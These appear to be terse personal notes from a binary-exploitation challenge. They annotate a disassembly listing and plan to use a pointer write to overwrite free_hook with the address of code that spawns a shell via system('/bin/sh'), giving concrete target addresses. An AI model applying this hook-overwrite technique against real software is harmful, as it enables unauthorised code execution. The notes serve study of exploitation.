//0x6022a0
//hook            0x400aeb 0x68732f6e69622f /* '/bin/sh' */

   0x00000000004009e4 <+154>:   mov    rax,QWORD PTR [rbp-0x10]		=> the address of ptr to rax
   0x00000000004009e8 <+158>:   mov    rax,QWORD PTR [rax]		=> the value at this address to rax
=> 0x00000000004009eb <+161>:   mov    rdx,rax				=> this value to rdx
   0x00000000004009ee <+164>:   mov    rax,QWORD PTR [rbp-0x10]		=> the address of ptr to rax again
   0x00000000004009f2 <+168>:   mov    rax,QWORD PTR [rax+0x8]	(1byte)	=> the address of ptr + 0x8(ptr + 1)
   0x00000000004009f6 <+172>:   mov    QWORD PTR [rdx],rax		



rbp-0x10: 0x6022a0(ptr)


*(long *)*ptr = *(ptr+1);
ptr 			ptr + 1
addr: 0x6022a0 		addr + 0x8: 0x6022a0 + 0x8

0x6022a0: value1	0x6022a0 + 0x8: value2(pointer to do system("/bin/sh")): 0x400a11

mov [value1], value2 

=> value1: should be address: the address of free_hook
=> value2: shoule be a value to exploit => system("/bin/sh")


 